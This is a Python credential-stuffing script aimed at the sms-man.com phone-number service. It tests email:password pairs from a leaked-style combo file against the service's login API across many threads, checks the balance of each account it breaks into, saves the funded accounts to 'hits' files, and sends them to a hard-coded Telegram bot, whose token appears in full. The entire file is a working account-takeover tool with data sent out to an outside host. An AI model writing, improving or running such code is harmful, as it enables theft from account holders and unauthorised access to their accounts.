import requests
from colorama import Fore
import concurrent.futures

def send_telegram_message(text):
    url = "https://api.telegram.org/bot5853992832:AAGZfsn1SNH0f4zWhGKxURm3QatbCZnJXMo/sendMessage"
    params = {'chat_id': 5894339732, 'text': text}
    requests.get(url, params=params)

def dinar_to_dollar(dinar):
    dollar = dinar / 100
    return f'{dollar:.2f}$'

def process_account(email, password):
    url = 'https://api.sms-man.com/control/get-api-key'
    data = f'{{"login":"{email}","password":"{password}"}}'
    head = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json",
        "Host": "api.sms-man.com",
        "User-Agent": "okhttp/4.9.1",
    }

    with requests.session() as session:
        post = session.post(url, data=data, headers=head)

        if 'apiKey' in post.text:
            api = post.json()['apiKey']
            get = session.get(f'https://api.sms-man.com/control/get-balance?token={api}', headers=head)
            balance = get.json()['balance']

            if balance == '0.00':
                print(Fore.YELLOW + f'{email}>Working Free:{dinar_to_dollar(float(balance))}')
            elif len(balance) == 5:
                print(Fore.YELLOW + f'{email}>Working, but this cent:{dinar_to_dollar(float(balance))}')
                with open('hits(cent).txt', 'a') as bb:
                    bb.write(f"{email}|{dinar_to_dollar(float(balance))}\n")
            else:
                print(Fore.YELLOW + f'{email}>{Fore.GREEN}Have money dollars:{dinar_to_dollar(float(balance))}')
                with open('hits(money).txt', 'a') as bb:
                    bb.write(f"{email}|{dinar_to_dollar(float(balance))}\n")
                    text_to_send = f"{email}|{dinar_to_dollar(float(balance))}\n"
                    send_telegram_message(text_to_send)
        else:
            print(Fore.YELLOW + f'{email}>{Fore.RED}Invalid Account')

if __name__ == "__main__":
    with open('shuffled_lines.txt', 'r') as file:
        accounts = [line.strip().split(':') for line in file.readlines()]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(lambda acc: process_account(acc[0], acc[1]), accounts)
